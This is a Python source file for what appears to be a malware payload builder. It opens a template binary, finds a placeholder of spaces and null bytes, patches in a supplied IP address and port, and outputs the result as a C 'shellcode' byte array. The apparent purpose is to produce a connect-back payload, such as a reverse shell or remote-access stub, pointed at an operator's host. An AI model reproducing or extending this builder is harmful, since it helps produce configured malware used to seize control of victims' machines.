import binascii, sys, os

class Build:
    OFFSET = 511
    def __init__(self, file_path, details):
        self.file_path = file_path
        self.ip_and_port = details.encode('utf-8')

    def generate_nullbytes(self):
        substring = b""
        for i in range(254): substring += b"\x00 "
        return b" \x00 " + substring

    def compile_exe(self):
        if getattr(sys, 'frozen', False):
            with open(os.path.join(sys._MEIPASS, "src", "binary_data.bin"), 'rb') as f: contents = f.read()
        else:
            with open(os.path.join("src", "binary_data.bin"), 'rb') as f:contents = f.read()
        start = contents.index(self.generate_nullbytes())
        entry_point = contents[start:start+self.OFFSET]
        details = contents[start:start+self.OFFSET]
        new_data = list(self.ip_and_port)
        modified_details = bytearray(details)
        pos = 0
        for i, char in enumerate(modified_details):
            if char == 32:  # Check for space character
                try:modified_details[i] = new_data[pos]  # Replace with ASCII 'A' (65)
                except:break
                pos += 1

        output = contents.replace(entry_point, modified_details)
        return output
    
    def gethex(self) -> bytes:
        binary = self.compile_exe()
        # Convert each byte to a hexadecimal representation with a space
        hexadecimal_data = " ".join([f"0x{byte:02X}," + (" \n" if (i + 1) % 10 == 0 else "") for i, byte in enumerate(binary)])
        data = "#include <stdio.h>\n#include <stdlib.h>\n\n"
        data += f"unsigned char shellcode[{len(binary)}] = {{\n " + hexadecimal_data + "\n};"
        return data
